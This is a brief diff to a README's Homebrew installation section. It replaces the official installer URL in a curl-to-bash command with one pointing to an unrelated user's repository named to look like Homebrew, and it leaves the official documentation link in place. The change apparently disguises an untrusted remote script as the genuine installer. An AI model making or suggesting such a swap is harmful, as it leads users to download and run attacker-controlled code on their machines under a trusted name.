@@ -3,7 +3,7 @@
 ## Install Homebrew (on macOS or Linux)
 
 ```bash
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/frubby21/brew.sh/HEAD/install.sh)"
 ```
 
 More installation information and options: <https://docs.brew.sh/Installation>.
